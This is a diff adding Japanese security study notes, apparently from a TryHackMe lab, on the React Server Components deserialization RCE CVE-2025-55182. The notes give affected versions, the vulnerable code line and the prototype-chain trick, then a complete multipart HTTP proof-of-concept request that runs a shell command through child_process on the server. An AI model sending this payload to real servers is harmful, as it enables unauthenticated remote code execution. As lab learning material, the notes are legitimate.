@@ -1,5 +1,80 @@
 # CVE
 
+## CVE-2025-55182 (React2Shell)
+
+https://tryhackme.com/room/react2shellcve202555182
+
+- 単一HTTPリクエストによる認証不要RCE
+- `19.0、19.1.0、19.1.1、19.2.0`
+- `react-server-dom-webpack、react-server-dom-parcel、react-server-dom-turbopack`
+
+### React Server Components
+
+- `React Server Components` はReact 19で導入された機能で、コンポーネントをクライアントのブラウザではなくサーバー上でレンダリングすることを可能する
+- 独自のシリアライズ方式を使用
+- デシリアライズに脆弱性
+
+### デシリアライズ処理
+
+```js
+function requireModule(metadata) {  
+    var moduleExports = __webpack_require__(metadata[0]);  
+    // ... additional logic ...  
+    return moduleExports[metadata[2]];  // VULNERABLE LINE  
+}  
+```
+
+javascriptでは、括弧記法でプロパティにアクセスするとき、オブジェクト自身だけでなくプロトタイプチェーン全体を走査する。  
+`$1:constructor:constructor` は、次のように解釈される。
+
+1. チャンク/モジュール1を取得
+2. .constructor プロパティにアクセス（コンストラクタ関数）
+3. 再度アクセス（これもコンストラクタ関数だがチェーンを確認）
+
+### PoC
+
+https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http
+
+HTTPリクエスト全体。マルチパートの3つの要素からなる。  
+Burp Repeater からホストとポートを指定してそのまま送れる。
+
+```http
+POST / HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
+Next-Action: x
+X-Nextjs-Request-Id: b5dce965
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
+Content-Length: 740
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{
+ "then": "$1:__proto__:then",
+ "status": "resolved_model",
+ "reason": -1,
+ "value": "{\"then\":\"$B1337\"}",
+ "_response": {
+   "_prefix": "var res=process.mainModule.require('child_process').execSync('cat /etc/flag.txt',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
+   "_chunks": "$Q2",
+   "_formData": {
+     "get": "$1:constructor:constructor"
+   }
+ }
+}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+```
+
 ## [CVE-2025-29927](https://www.exploit-db.com/exploits/52124)  (Next.js)
 
 - Next.js Middleware 認証バイパス
